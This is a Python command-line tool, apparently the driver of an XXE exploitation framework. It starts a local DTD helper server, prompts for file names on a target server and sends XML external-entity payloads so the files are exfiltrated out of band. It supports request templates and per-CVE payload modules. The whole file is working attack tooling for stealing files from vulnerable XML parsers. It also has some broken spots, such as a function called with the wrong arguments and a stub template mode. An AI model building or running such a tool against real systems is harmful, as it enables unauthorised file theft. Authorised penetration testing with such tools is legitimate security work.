#!/usr/bin/env python3
import ipaddress
import logging
import sys, os
import signal
import argparse
from multiprocessing import Process
from lib.dtdserver import startServer
import time

from lib.AttackSession import AttackSession, CliBuilder, ModuleBuilder, TemplateBuilder


from urllib.parse import urlparse


def urltype(arg):
    """A type parser for an url scheme://host:port """
    url = urlparse(arg)
    if all((url.scheme, url.netloc)):
        return arg
    raise argparse.ArgumentTypeError('Invalid URL')


def host_port_type(arg):
    """A type parser for an url ip:port """
    try:
        host, port = arg.split(':')
        port = int(port)
        ip = ipaddress.ip_address(host)
        return ip, port
    except Exception as e:
        logging.exception('because')
        raise argparse.ArgumentTypeError('Invalid URL')


def callabletype(name):
    import importlib
    try:
        obj = importlib.import_module(name)
    except:
        raise argparse.ArgumentTypeError('name is not a module')
    if not hasattr(obj, 'build_payload'):
        raise argparse.ArgumentTypeError(f'module {name} does not have a build_payload callable')
    cb = getattr(obj, 'build_payload')
    if not callable(cb):
        raise argparse.ArgumentTypeError(f'{name}.build_payload is not callable')
    return cb


def start_loop(attackSession):
    """CLI loop. input a filename, get it exfiltrated and print on screen """
    try:
        while True:
            print("------")
            targetFile = input("Target File: ")
            print("[+] Sending XML request...")
            response = attackSession.sendPayload(targetFile)
            print(("[+] Server Response: {}".format(response.status_code)))
            
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
        sys.exit(0)


def run_cli(args):
    # DTD server
    p = start_dtd_server(args)

    # start a CLI and
    # make a XXE query
    try:
        attackSession = AttackSession(args.requestFile)
        start_loop(attackSession, args)
        p.kill()
    except Exception as e:
        logging.exception("[-] Error running ")
        p.kill()
        sys.exit(1)

    return

def run_template(args):
    return


def start_dtd_server(args):
    # DTD server
    print("[+] Starting DTD server....")
    p = Process(target=startServer, kwargs=dict(ip=args.dtdserver[0], port=args.dtdserver[1], isb64=args.isb64))
    p.start()
    # TODO / check DTD server online.
    return p


def run_module(args):
    build_payload = args.modulename

    p = start_dtd_server(args)

    # start a CLI and
    # make a XXE query
    try:
        attackSession = ModuleBuilder(target=args.target, build_payload=args.modulename, dtdserver=args.dtdserver) # , **args.__dict__)
        start_loop(attackSession)
        p.kill()
    except Exception as e:
        logging.exception("[-] Error running ")
        p.kill()
        sys.exit(1)
    return


def main():
    # use a text file for the body with {} param formating
    # xxtimes xxe://target:port -f requestFile dtd://host:port
    # use a module to format the request body
    # xxtimes xxe://target:port dtd://host:port  -m cve-xxx-xxx
    parser = argparse.ArgumentParser(description="Local File Explorer Using XXE DTD Entity Expansion")
    base = parser.add_argument_group(title='base', description='base info')
    base.add_argument('target', type=urltype, help="target scheme://server:port")
    base.add_argument('--dtdserver', type=host_port_type, default='0.0.0.0:8000', help="local address to listen for dtd HTTP helper server")
    base.add_argument('--b64', dest='isb64', action='store_true', default=False, help="Flag if data will be base64 encoded (e.g. using php's convert.base64 function for files)")
    subparsers = parser.add_subparsers()

    # post / get
    cli = subparsers.add_parser('cli', help='build xxe on cli')
    cli.add_argument('--method', choices=['GET', 'POST'])
    cli.add_argument('--header', nargs='*', help="the XML? data to send as data")
    cli.add_argument('--data', help="the XML? data to send as data - use")
    cli.set_defaults(func=run_cli)

    # or read from file
    request_template = subparsers.add_parser('template', help='build xxe from a template with {dtdHost}, and {dtdPort} ')
    request_template.add_argument('-f', '--requestFile', dest='requestFile', type=argparse.FileType('r'), required=True, help="Vulnerable request file with {targetFilename}, {xxeHelperServerInterface}, and {xxeHelperServerPort} marked")
    request_template.set_defaults(func=run_template)

    # or use a module to generate
    module = subparsers.add_parser('module', help='build xxe from a python callable')
    # module.add_argument('-f', '--requestFile', dest='requestFile', type=argparse.FileType('rb'), help="Vulnerable request file template")
    module.add_argument('modulename', type=callabletype, help="Build payload using a python callable")
    module.set_defaults(func=run_module)

    args = parser.parse_args()

    # call the right function
    args.func(args)
    return


if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)
    main()
